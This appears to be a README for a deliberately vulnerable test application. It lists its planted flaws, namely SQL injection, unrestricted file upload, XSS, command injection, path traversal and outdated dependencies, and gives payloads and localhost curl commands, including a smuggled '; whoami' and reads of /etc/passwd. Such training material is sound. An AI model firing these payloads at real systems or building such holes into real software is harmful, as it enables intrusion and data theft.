# Intentional Vulnerabilities - FOR TESTING ONLY

⚠️ **WARNING**: This application contains intentional security vulnerabilities for educational and testing purposes. NEVER deploy to production.

## Vulnerability List

### 1. SQL Injection (CWE-89)
- **Endpoint**: `GET /api/search-vuln`
- **Payload**: `' OR 1=1 --`
- **Impact**: Database compromise

### 2. File Upload Vulnerabilities (CWE-434)
- **Endpoint**: `POST /api/upload`
- **Issues**: No file type validation, path traversal
- **Impact**: Remote code execution

### 3. Cross-Site Scripting (CWE-79)
- **Endpoint**: `GET /api/profile/:username`
- **Impact**: Client-side code execution

### 4. Command Injection (CWE-78)
- **Endpoint**: `POST /api/ping`
- **Payload**: `; cat /etc/passwd`
- **Impact**: Remote command execution

### 5. Directory Traversal (CWE-22)
- **Endpoint**: `GET /api/files/:filename`
- **Payload**: `../../../etc/passwd`
- **Impact**: File system access

### 6. Information Disclosure (CWE-200)
- **Endpoints**: `/api/debug/*`
- **Impact**: Sensitive data exposure

### 7. Vulnerable Dependencies
- **lodash**: 4.17.4 (Prototype Pollution)
- **moment**: 2.19.3 (ReDoS)
- **request**: 2.88.0 (Multiple vulnerabilities)
- **express**: 4.16.0 (Multiple vulnerabilities)

## Testing Commands

```bash
# SQL Injection
curl -H "Authorization: Bearer TOKEN" \
     "http://localhost:8080/api/search-vuln?query=' OR 1=1 --"

# Command Injection  
curl -X POST -H "Authorization: Bearer TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"host":"localhost; whoami"}' \
     http://localhost:8080/api/ping

# Directory Traversal
curl -H "Authorization: Bearer TOKEN" \
     "http://localhost:8080/api/files/..%2F..%2F..%2Fetc%2Fpasswd"

